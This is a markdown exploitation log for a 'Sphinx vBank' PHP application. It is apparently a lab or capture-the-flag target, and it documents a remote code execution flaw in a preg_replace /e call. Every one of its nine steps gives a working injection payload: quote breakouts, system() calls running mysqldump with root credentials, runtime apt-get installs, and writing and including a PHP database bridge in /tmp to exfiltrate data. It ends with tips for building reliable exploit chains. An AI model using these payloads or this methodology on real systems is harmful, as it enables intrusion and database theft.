# Sphinx vBank: RCE to Database Troubleshooting Log

This document records the systematic attempts to exploit the Remote Code Execution (RCE) vulnerability in `pages/htbdetails.page` for the purpose of database exfiltration.

## Vulnerability Overview
- **Location**: `/home/passwd/bank_app/pages/htbdetails.page` (Lines 98-99)
- **Vector**: Improper neutralization in the `query` parameter combined with the deprecated `/e` (evaluate) modifier in `preg_replace()`.
- **Context**: The web application runs on PHP 5.6 inside a Docker container (`vbank_app`), while the database runs in a separate container (`vbank_mysql`).

---

## Step 1: Initial Command Injection (Double Quote Breakout)
**Payload**: `query=" . system('id') . "`
- **Why we tried it**: Standard PHP string breakout. We assumed the `$http['query']` variable was being concatenated into a double-quoted string.
- **Why it failed**: The internal PHP evaluator context for the inner `preg_replace` actually wraps the pattern in single quotes: `'#\b" . $query . "\b#i'`. Using double quotes resulted in a syntax error because we weren't breaking out of the single-quoted literal.

## Step 2: Syntax Correction (Single Quote Breakout)
**Payload**: `query=test'.system('id').'`
- **Why we tried it**: Adjusted to match the internal single-quote string context.
- **Result**: **Partial Success**. The command `id` executed, but our follow-up command `mysqldump` failed to produce a file.

## Step 3: Network Pivot (Host Identification)
**Payload**: `query=test'.system('mysqldump -u root -paaa vbank > vbank_dump.sql').'`
- **Why we tried it**: Attempted to use the standard database backup utility.
- **Why it failed**: In a Docker Compose environment, `localhost` refers to the `vbank_app` container itself. The database was isolated in the `mysql` container. The command failed because it could not find a running MySQL instance on `127.0.0.1`.

## Step 4: Credential Discovery (Dynamic Host Targeting)
**Payload**: `query=test'.include('../etc/config.php').(print $htbconf['db/.server']).'`
- **Why we tried it**: We leveraged RCE to read the application's own configuration to find the correct database hostname (`mysql`).
- **Result**: Confirmed the host was `mysql`.

## Step 5: Binary Dependency Check (The Missing Client)
**Payload**: `query=test'.system('mysqldump -h mysql -u root -paaa vbank > vbank_dump.sql').'`
- **Why we tried it**: Targeted the correct container host using `-h mysql`.
- **Why it failed**: **Binary Not Found**. Verification via `which mysqldump` confirmed that the `mysql-client` package was not installed in the `Dockerfile`. The system could not execute a utility that didn't exist.

## Step 6: Infrastructure Manipulation (apt-get)
**Payload**: `query=test'.set_time_limit(0).(system('apt-get update && apt-get install -y mysql-client')).'`
- **Why we tried it**: Attempted to install the missing binary at runtime since the container was running as `root`.
- **Why it failed**: Environment restrictions. `apt-get` failed due to the lack of an interactive TTY, potential timeout issues, and lock file contention within the non-interactive web server execution context.

## Step 7: The "Pure PHP" Bridge (Web Root Write Attempt)
**Payload**: `query=test'.file_put_contents('bridge.php', '<?php ... mysql_connect(...) ... ?>').'`
- **Why we tried it**: To avoid external binary dependencies by using PHP's built-in `mysql_` extension to talk directly to the database container over the Docker bridge.
- **Why it failed**: **Permission Denied**. The web root directory (`/var/www/html`) was mounted as read-only or owned by a different user than the web process (`www-data`), preventing the creation of new files.

## Step 8: Syntax Collision (The Regex "Suck-in")
**Payload**: `query=test'.include('/tmp/bridge.php').'`
- **Why we tried it**: Attempted to include a bridge file written to a globally writable directory (`/tmp`).
- **Why it failed**: The trailing characters of the regex (`\b#i`) were being concatenated into the `include` filename. PHP attempted to find a file literally named `/tmp/bridge.php\b#i`, resulting in a `File Not Found` error.

## Step 9: The Final Successful Chain (Parentheses & /tmp)
**Payload**: `query=test'.(include('/tmp/bridge.php')).'`
- **Why we tried it**: 
    1. Used `/tmp` to bypass web root write restrictions.
    2. Wrapped the command in parentheses `(include(...))` to ensure the PHP language construct was evaluated as a self-contained expression, preventing it from "swallowing" the trailing regex characters.
- **Result**: **Success**. We successfully established a persistent database bridge that bypassed file system restrictions, missing binaries, and network isolation.

---

## Lessons Learned
1. **Environment Awareness**: Always verify the existence of binaries (`mysqldump`, `curl`, etc.) before relying on them in an exploit chain.
2. **Container Networking**: Hostnames in Docker Compose are service-based; `localhost` is rarely the database host.
3. **Quote Context**: In RCE, the difference between `'` and `"` is determined by the internal string concatenation logic of the vulnerable function.
4. **Expression Isolation**: When injecting into a string that will be followed by more characters (like a regex pattern), always use parentheses or comments to terminate your injected expression cleanly.
```
